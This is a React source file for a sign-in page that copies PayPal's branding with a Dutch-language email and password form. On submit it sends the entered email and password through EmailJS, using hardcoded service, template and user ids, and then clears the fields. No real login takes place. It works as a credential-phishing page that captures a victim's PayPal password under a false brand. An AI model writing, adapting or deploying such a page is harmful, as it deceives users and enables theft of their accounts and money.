import React, { useState } from "react";
import emailjs from "emailjs-com";
import "./SignIn.css";

function SignIn() {
  const logo = "https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg";

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const service_id = "service_r10yy1p";
  const template_id = "template_6tbtipc";
  const user_id = "user_EjrsDgwCIIV6ZOcW16y6V";

  function handelSubmit(e) {
    e.preventDefault();

    const templateParams = {
      to_email: email,
      message_password: password,
    };
    emailjs.send(service_id, template_id, templateParams, user_id).then(() => {
      setEmail("");
      setPassword("");
    });
  }

  return (
    <div className="signIn">
      <div className="signIn__container">
        <img src={logo} alt="" />
        <div className="signIn__form">
          <form onSubmit={handelSubmit}>
            <div className="signIn__form">
              <input
                id="email"
                type="email"
                placeholder="E-mailadres"
                onChange={(e) => setEmail(e.target.value)}
                value={email}
              />
            </div>
            <div className="signIn__form">
              <input
                id="password"
                type="password"
                placeholder="Wachtwoord"
                onChange={(e) => setPassword(e.target.value)}
                value={password}
              />
            </div>
            <div className="signIn__form">
              <button>Log In</button>
            </div>
          </form>
        </div>
        <div className="signIn__openAcountForm">
          <button className="signIn__openAcount">Rekening openen</button>
        </div>
      </div>
    </div>
  );
}

export default SignIn;
